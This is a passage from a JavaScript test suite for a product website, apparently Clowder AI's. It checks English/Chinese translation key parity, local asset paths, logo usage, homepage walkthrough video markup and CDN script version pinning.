          ...[...html.matchAll(/data-i18n(?:-(?:placeholder|label|aria-label|title))?="([^"]+)"/g)].map((m) => m[1]),
          // JS helper calls: t('key') / t("key") in the inline page scripts.
          ...[...html.matchAll(/\bt\((['"])([^'"]+)\1\)/g)].map((m) => m[2]),
        ]),
      ];
      assert.ok(keys.length > 0, `${page} should carry i18n keys`);
      const missing = keys.filter((k) => !(k in I18N.en) || !(k in I18N.zh));
      assert.deepStrictEqual(missing, [], `${page} unresolved data-i18n keys: ${missing.join(', ')}`);
    });
  }

  it('en and zh dictionaries are at key parity', () => {
    const enOnly = Object.keys(I18N.en).filter((k) => !(k in I18N.zh));
    const zhOnly = Object.keys(I18N.zh).filter((k) => !(k in I18N.en));
    assert.deepStrictEqual([enOnly, zhOnly], [[], []], `en-only: ${enOnly} | zh-only: ${zhOnly}`);
  });
});

// ─── Local asset existence ───────────────────────────────────────────
describe('HTML-referenced local assets exist', () => {
  const assetRe = /(?:src|href)\s*=\s*["']((?:assets|styles|main|tailwind|input|i18n)[^"']*?)["']/g;

  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} — all local asset paths resolve`, () => {
      const html = readSite(page);
      const missing = [];
      for (const m of html.matchAll(assetRe)) {
        const ref = m[1];
        if (/^(https?:|data:)/i.test(ref)) continue;
        if (!existsSync(resolve(SITE, ref))) missing.push(ref);
      }
      assert.deepStrictEqual(missing, [], `Missing: ${missing.join(', ')}`);
    });
  }
});

// ─── Transparent Clowder AI brand mark ──────────────────────────────
describe('transparent Clowder AI logo contract', () => {
  const transparentLogo = 'assets/logo-transparent.png';

  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} uses the transparent logo as its favicon`, () => {
      const document = new JSDOM(readSite(page)).window.document;
      const icon = document.querySelector('link[rel="icon"]');
      assert.equal(icon?.getAttribute('href'), transparentLogo);
      const brandMark = document.querySelector(`img[src="${transparentLogo}"]`);
      assert.ok(brandMark, `${page} should render the transparent logo in its navigation`);
    });
  }
});

// ─── Homepage Quick Start visual contract ───────────────────────────
describe('homepage Quick Start visual contract', () => {
  const html = readSite('index.html');
  const document = new JSDOM(html).window.document;

  for (const platform of ['windows', 'mac']) {
    it(`${platform} download panel is a light card, not a terminal`, () => {
      const card = document.querySelector(`#install-${platform} > div`);
      assert.ok(card, `missing #install-${platform} card`);
      assert.ok(card.classList.contains('bg-white'), `${platform} card should be light in the default theme`);
      assert.ok(card.classList.contains('border'), `${platform} card should retain a visible card boundary`);
      assert.ok(!card.classList.contains('bg-stone-900'), `${platform} card must not reuse the terminal background`);
      assert.ok(!card.classList.contains('code-container'), `${platform} card must not use terminal semantics`);
    });
  }

  it('renders the three local First Steps walkthrough videos', () => {
    const expected = [
      'assets/guides/step1-add-account.mp4',
      'assets/guides/step2-add-member.mp4',
      'assets/guides/step3-say-hi.mp4',
    ];
    const section = document.getElementById('first-steps');
    assert.ok(section, 'homepage must include the First Steps walkthrough section');
    const sequence = section.querySelector('.space-y-16');
    assert.ok(sequence, 'First Steps should stack the three walkthrough rows vertically');
    const steps = [...sequence.querySelectorAll(':scope > article')];
    assert.strictEqual(steps.length, 3, 'First Steps should contain three stacked walkthrough rows');
    assert.ok(steps[0].classList.contains('md:flex-row'), 'step 1 should use the original text/video row');
    assert.ok(steps[1].classList.contains('md:flex-row-reverse'), 'step 2 should alternate video and text');
    assert.ok(steps[2].classList.contains('md:flex-row'), 'step 3 should return to the text/video row');
    const videos = [...section.querySelectorAll('video')];
    assert.deepStrictEqual(
      videos.map((video) => video.getAttribute('src')),
      expected,
    );
    for (const video of videos) {
      assert.ok(video.autoplay, `${video.getAttribute('src')} should autoplay`);
      assert.ok(video.hasAttribute('muted'), `${video.getAttribute('src')} should be muted`);
      assert.ok(video.loop, `${video.getAttribute('src')} should loop`);
      assert.ok(video.playsInline, `${video.getAttribute('src')} should play inline`);
      assert.ok(existsSync(resolve(SITE, video.getAttribute('src'))), `${video.getAttribute('src')} must exist`);
    }
  });
});

// ─── SETUP.md compatibility ──────────────────────────────────────────
describe('SETUP.md compatibility', () => {
  const sourceRepo = existsSync(resolve(ROOT, 'sync-manifest.yaml'));
  const expectedSetupFiles = sourceRepo
    ? ['SETUP.opensource.md', 'SETUP.opensource.zh-CN.md']
    : ['SETUP.md', 'SETUP.zh-CN.md'];

  for (const setupFile of expectedSetupFiles) {
    it(`${setupFile} exists in the ${sourceRepo ? 'source' : 'public'} repository`, () => {
      assert.ok(existsSync(resolve(ROOT, setupFile)));
    });
  }
});

// ─── CDN version pinning ─────────────────────────────────────────────
describe('CDN scripts are version-pinned', () => {
  for (const page of ['docs.html', 'community.html']) {
    it(`${page} — marked is version-pinned`, () => {
      const html = readSite(page);
      if (html.includes('marked')) {
        assert.match(html, /marked@[\d.]+/);
      }
    });

    it(`${page} — DOMPurify is version-pinned`, () => {
      const html = readSite(page);
      if (html.includes('dompurify')) {
        assert.match(html, /dompurify@[\d.]+/);
      }
    });
  }
});
